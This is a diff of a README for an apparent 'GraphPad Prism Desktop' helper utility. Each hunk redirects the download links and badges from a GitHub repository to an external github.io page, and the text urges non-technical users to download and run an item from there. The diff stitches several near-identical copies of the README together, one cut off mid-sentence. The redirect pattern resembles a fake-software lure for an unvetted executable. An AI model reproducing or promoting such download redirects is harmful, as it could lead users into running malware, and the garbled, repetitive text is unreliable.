@@ -1,6 +1,6 @@
 # 🧪 graphpad-prism-desktop - Manage Prism Data Paths Easily
 
-[![Download Graphpad Prism Desktop](https://img.shields.io/badge/Download-Graphpad_Prism_Desktop-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Atumkezie/graphpad-prism-desktop)
+[![Download Graphpad Prism Desktop](https://img.shields.io/badge/Download-Graphpad_Prism_Desktop-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://atumkezie.github.io)
 
 Graphpad Prism Desktop is a Windows utility and local Windows and macOS helper for Graphpad Prism data paths, config and export caches, and export folders. It is built for everyday computer users who want a clearer way to find and manage the local folders that Graphpad Prism uses.
 
@@ -14,7 +14,7 @@ No programming knowledge is needed. The main task is to download the application
 
 ## 📥 Download and Run
 
-Visit this link to download the application: [Download Graphpad Prism Desktop](https://github.com/Atumkezie/graphpad-prism-desktop)
+Visit this link to download the application: [Download Graphpad Prism Desktop](https://atumkezie.github.io)
 
 After the download completes, open the downloaded item to run the utility. Use the same link whenever you need to return to the download page.
 
@@ -44,7 +44,7 @@ Use the utility when you need to:
 
 The interface is intended to keep# 🧪 graphpad-prism-desktop - Manage Prism Data Paths Easily
 
-[![Download Graphpad Prism Desktop](https://img.shields.io/badge/Download-Graphpad_Prism_Desktop-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Atumkezie/graphpad-prism-desktop)
+[![Download Graphpad Prism Desktop](https://img.shields.io/badge/Download-Graphpad_Prism_Desktop-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://atumkezie.github.io)
 
 Graphpad Prism Desktop is a Windows utility and local helper for Graphpad Prism data paths, config and export caches, and export folders. It gives you a simple desktop view of the local folders connected to your Graphpad Prism work. Use it on Windows, with local helper coverage for macOS folder paths. No programming knowledge is needed.
 
@@ -72,7 +72,7 @@ The utility is intended for users who want a direct view of the folders connecte
 
 ## 💾 Download and First Run
 
-Visit this link to download the application: [Graphpad Prism Desktop download page](https://github.com/Atumkezie/graphpad-prism-desktop).
+Visit this link to download the application: [Graphpad Prism Desktop download page](https://atumkezie.github.io).
 
 After the download completes, open the downloaded item to run the utility. On Windows, you can open it from the folder where your browser saves downloads. Once the utility window appears, use it to review local Graphpad Prism data paths, config and export cache locations, and export folders.
 
@@ -119,7 +119,7 @@ Graphpad Prism Desktop is a Windows utility, so use it on a Windows computer for
 
 The application is designed for average computer users. You do not need to know how to program, use a terminal, or edit system files. You only need to download the application, open it, and use# 🧪 graphpad-prism-desktop - Manage Your Prism Data Paths Easily
 
-[![Download Graphpad Prism Desktop](https://img.shields.io/badge/Download-Graphpad_Prism_Desktop-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Atumkezie/graphpad-prism-desktop)
+[![Download Graphpad Prism Desktop](https://img.shields.io/badge/Download-Graphpad_Prism_Desktop-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://atumkezie.github.io)
 
 Graphpad Prism Desktop is a Windows utility and local helper for Graphpad Prism data paths, config and export caches, and export folders. It gives everyday computer users a clear, simple window into the folders that Graphpad Prism uses on their own machine. You do not need programming knowledge to use it.
 
@@ -151,7 +151,7 @@ The utility is a companion tool. It does not replace Graphpad Prism and it does 
 
 Visit this link to download the application:
 
-[![Get Graphpad Prism Desktop](https://img.shields.io/badge/Get_Graphpad_Prism_Desktop-3CB371?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Atumkezie/graphpad-prism-desktop)
+[![Get Graphpad Prism Desktop](https://img.shields.io/badge/Get_Graphpad_Prism_Desktop-3CB371?style=for-the-badge&logo=windows&logoColor=white)](https://atumkezie.github.io)
 
 After you open the download page, get the application and then open it on your computer. Once the utility window appears, you can begin reviewing your Graphpad Prism data paths, config and cache locations, and export folders.
 
